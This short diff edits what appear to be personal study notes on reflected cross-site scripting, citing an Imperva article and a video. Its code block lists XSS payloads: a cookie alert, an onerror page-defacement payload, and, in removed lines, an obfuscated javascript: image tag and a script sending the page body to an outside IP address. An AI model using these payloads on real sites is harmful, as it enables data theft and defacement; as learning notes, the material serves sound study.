@@ -21,9 +21,7 @@ https://www.imperva.com/learn/application-security/reflected-xss-attacks/#:~:tex
 https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
 ```js
 <script>alert(document.cookie); </script>
-<img src="http://url.to.file.which/not.exist" onerror= document.body.innerHTML = "<h1>You got hacked</h1>";>
-<IMG SRC=j&#X41vascript:alert('test2')>
-<script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>
+<img src="http://url.to.file.which/not.exist" onerror= document.body.innerHTML = "<h1>You got hacked</h1>">
 <img 
   src="https://jnx.me/img/profile.jpg" 
   style="display:none" 
